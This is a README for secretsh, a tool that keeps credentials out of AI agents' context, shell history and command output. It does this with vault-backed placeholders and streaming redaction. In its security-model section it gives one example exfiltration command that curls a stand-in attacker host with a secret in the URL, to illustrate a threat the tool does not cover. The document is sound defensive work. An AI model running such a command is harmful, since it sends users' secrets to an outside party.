# secretsh

**Secure subprocess secret injection for AI agents.**

[![CI](https://github.com/lthoangg/secretsh/actions/workflows/ci.yml/badge.svg)](https://github.com/lthoangg/secretsh/actions/workflows/ci.yml)
[![Crates.io](https://img.shields.io/crates/v/secretsh.svg)](https://crates.io/crates/secretsh)
[![PyPI](https://img.shields.io/pypi/v/secretsh.svg)](https://pypi.org/project/secretsh/)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

secretsh keeps credentials out of LLM context, shell history, and command output. AI agents write commands with `{{PLACEHOLDER}}` tokens; secretsh resolves them against an encrypted vault and redacts any secrets that leak back through stdout/stderr.

```
Agent prompt:  curl -u admin:{{API_PASS}} https://internal/api
Child argv:    curl -u admin:hunter2 https://internal/api
Agent sees:    curl -u admin:[REDACTED_API_PASS] https://internal/api
```

---

## Why

When an AI agent runs `curl -u admin:hunter2 ...`, three things go wrong:

1. **The LLM knows the secret** and can be tricked into leaking it.
2. **Shell history records it** in `~/.bash_history`.
3. **Command output may echo it** back (`curl -v`, misconfigured services), and the LLM ingests it.

secretsh fixes all three: secrets live in an encrypted vault, enter the process only at `exec` time, and are scrubbed from output before anything reaches the caller.

---

## Install

### Homebrew (macOS / Linux)

```bash
brew tap lthoangg/tap
brew install secretsh
```

### PyPI

```bash
uv add secretsh
# or
pip install secretsh
```

### From source

```bash
cargo install secretsh
```

### Pre-built binaries

Download from [GitHub Releases](https://github.com/lthoangg/secretsh/releases) for:
- `x86_64-apple-darwin`
- `aarch64-apple-darwin`
- `x86_64-unknown-linux-gnu`
- `aarch64-unknown-linux-gnu`

### Requirements

- macOS 10.15+ or Linux (glibc)
- Rust 1.75+ (build from source only)

---

## Quick Start

### 1. Set your master passphrase

This prompt is silent -- type your passphrase and press Enter. Nothing is saved to shell history.

```bash
read -rs SECRETSH_KEY && export SECRETSH_KEY
```

All commands default to reading the passphrase from `SECRETSH_KEY`. Use `--master-key-env OTHER_VAR` to override.

### 2. Create a vault and add secrets

```bash
secretsh init
```

**Easiest: import from an existing `.env` file:**

```bash
secretsh import-env -f .env
```

**Or add secrets one at a time** (input is hidden, press Enter to submit):

```bash
secretsh set API_PASS
# Enter secret for API_PASS: ********
secretsh set API_USER
# Enter secret for API_USER: ********
```

### 3. Run commands with `{{placeholders}}`

```bash
secretsh run -- "curl -u {{API_USER}}:{{API_PASS}} https://httpbin.org/basic-auth/admin/hunter2"
```

The output is always scrubbed -- any vault secret (raw, base64, URL-encoded, or hex) is replaced with `[REDACTED_<KEY>]`.

### 4. See what's stored

```bash
secretsh list
```

Values are never displayed.

---

## Commands

| Command | Description |
|---------|-------------|
| `secretsh init` | Create a new encrypted vault |
| `secretsh set <KEY>` | Store a secret (interactive hidden input) |
| `secretsh delete <KEY>` | Remove a secret |
| `secretsh list` | List key names (never values) |
| `secretsh run -- "cmd"` | Execute a command with secret injection + output redaction |
| `secretsh export --out <path>` | Export vault to an encrypted backup |
| `secretsh import --in <path>` | Import entries from a backup |
| `secretsh import-env -f <path>` | Import secrets from a `.env` file |

All commands read the passphrase from the `SECRETSH_KEY` environment variable by default. Use `--master-key-env <ENV_VAR>` to read from a different variable. The passphrase itself is never passed on the command line.

---

## Security Model

### What secretsh protects against

- Secret leakage into LLM prompt/context (placeholder model)
- Secret leakage via shell history
- Secret leakage via stdout/stderr (Aho-Corasick streaming redaction)
- Encoded secret leakage (base64, URL-encoding, hex)
- Vault tampering (HMAC-authenticated header + per-entry AES-256-GCM with positional AAD + full-file commit tag)
- Metadata leakage from vault file (key names are encrypted)
- Core dump inclusion (RLIMIT_CORE=0)

### What is explicitly out of scope

- `/proc/<pid>/cmdline` inspection (secret is in child argv for its lifetime)
- Physical memory attacks (cold boot, kernel exploits)
- Malicious commands that exfiltrate their own arguments
- Compromise of the master passphrase itself

**To be clear** -- this isn't a silver bullet. It doesn't stop a truly malicious command from exfiltrating data (e.g. `curl attacker.com/{{OUR_API_KEY}}`). But it does solve the massive problem of accidental exposure in logs, history, and LLM context windows.

See [docs/threat-model.md](docs/threat-model.md) for the full threat model and technical architecture.

### Cryptographic Primitives

| Component | Algorithm | Library |
|-----------|-----------|---------|
| Encryption | AES-256-GCM | `ring` |
| MAC | HMAC-SHA256 | `ring` |
| KDF | Argon2id (128 MiB, t=3, p=4) | `argon2` |
| Key expansion | HKDF-SHA256 | `ring` |
| Random | OS CSPRNG | `ring::rand::SystemRandom` |

Key derivation uses HKDF domain separation: the Argon2id output is never used directly. Independent subkeys are derived for encryption (`secretsh-enc-v1`) and HMAC (`secretsh-mac-v1`).

---

## Architecture

```
                    +------------------+
  Agent writes:     | curl {{API_KEY}} |   (placeholder — LLM never sees the value)
                    +--------+---------+
                             |
                    +--------v---------+
                    |    Tokenizer     |   Strict POSIX-subset parser
                    | (rejects pipes,  |   No shell intermediary
                    |  globs, $(), ;)  |
                    +--------+---------+
                             |
                    +--------v---------+
                    |  Vault Decrypt   |   AES-256-GCM + Argon2id
                    |  + Placeholder   |   Resolve {{KEY}} -> value
                    |    Resolution    |
                    +--------+---------+
                             |
                    +--------v---------+
                    |  posix_spawnp()  |   Direct exec, no sh -c
                    |  (macOS)         |   argv zeroized after spawn
                    +--------+---------+
                             |
                    +--------v---------+
                    |  Aho-Corasick    |   O(n) streaming redaction
                    |  Output Filter   |   Raw + base64 + URL + hex
                    +--------+---------+
                             |
                    +--------v---------+
  Agent receives:   | [REDACTED_KEY]   |   Scrubbed output
                    +------------------+
```

---

## Configuration

### Vault Location

| Platform | Default path |
|----------|-------------|
| macOS | `~/Library/Application Support/secretsh/vault.bin` |
| Linux | `$XDG_DATA_HOME/secretsh/vault.bin` |

Override with `--vault <path>` on any command.

### Multiple Vaults

Every command accepts `--vault`, so you can maintain separate vaults for different contexts:

```bash
# Work vault
secretsh init --vault ~/.secretsh/work.vault --master-key-env WORK_KEY
secretsh import-env -f .env.work --vault ~/.secretsh/work.vault --master-key-env WORK_KEY

# Personal vault
secretsh init --vault ~/.secretsh/personal.vault --master-key-env PERSONAL_KEY
secretsh import-env -f .env.personal --vault ~/.secretsh/personal.vault --master-key-env PERSONAL_KEY

# Run from either
secretsh run --vault ~/.secretsh/work.vault --master-key-env WORK_KEY -- \
    "curl -H 'Token: {{API_TOKEN}}' https://api.example.com"
```

Each vault is independent: different passphrase, different salt, different entries.

### Resource Limits

| Limit | Default | Flag |
|-------|---------|------|
| Child timeout | 300s | `--timeout` |
| Max stdout | 50 MiB | `--max-output` |
| Max stderr | 1 MiB | `--max-stderr` |

Exceeding any limit triggers SIGTERM + SIGKILL escalation (exit code 124).

---

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1-125 | Child process exit code (passthrough) |
| 124 | Timeout or output limit exceeded |
| 125 | secretsh internal error |
| 126 | Command not executable |
| 127 | Command not found |
| 128+N | Child killed by signal N |

---

## Python API

secretsh provides native Python bindings via PyO3. Secrets stay on the Rust heap and never cross the FFI boundary as Python `str`.

```python
import secretsh

with secretsh.Vault(master_key_env="SECRETSH_KEY") as vault:
    vault.set("API_KEY", bytearray(b"sk-live-abc123"))  # bytearray is zeroed after copy
    result = vault.run("curl -H 'Authorization: Bearer {{API_KEY}}' https://api.example.com")
    print(result.stdout)     # -> "... Authorization: Bearer [REDACTED_API_KEY] ..."
    print(result.exit_code)  # -> 0
```

### Install from source

```bash
uv venv .venv && source .venv/bin/activate
uv sync --group dev                       # install dev deps (pytest, pytest-cov)
maturin develop --features python          # build + install into venv
python -m pytest tests/ -v                 # run tests
```

Requires Python 3.10+.

---

## Development

```bash
# Build
cargo build

# Run Rust tests (188 unit tests)
cargo test

# Lint
cargo clippy -- -D warnings

# Format
cargo fmt

# Build release
cargo build --release

# Python bindings
maturin develop --features python
python -m pytest tests/ -v
```

---

## Examples

See [`examples/`](examples/) for runnable examples:

| File | What it demonstrates |
|------|---------------------|
| [`basic_cli.sh`](examples/basic_cli.sh) | Full CLI walkthrough: init, set, list, run, export, import, delete, exit codes |
| [`basic_python.py`](examples/basic_python.py) | Python API: set, run, redaction, bytearray zeroing, timeout, error handling, export/import |
| [`multi_vault.py`](examples/multi_vault.py) | Multiple vaults with different passphrases for staging vs production |

```bash
read -rs SECRETSH_KEY && export SECRETSH_KEY
bash examples/basic_cli.sh
python examples/basic_python.py
```

---

## License

[MIT](LICENSE)

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

## Security

To report a vulnerability, see [SECURITY.md](SECURITY.md).
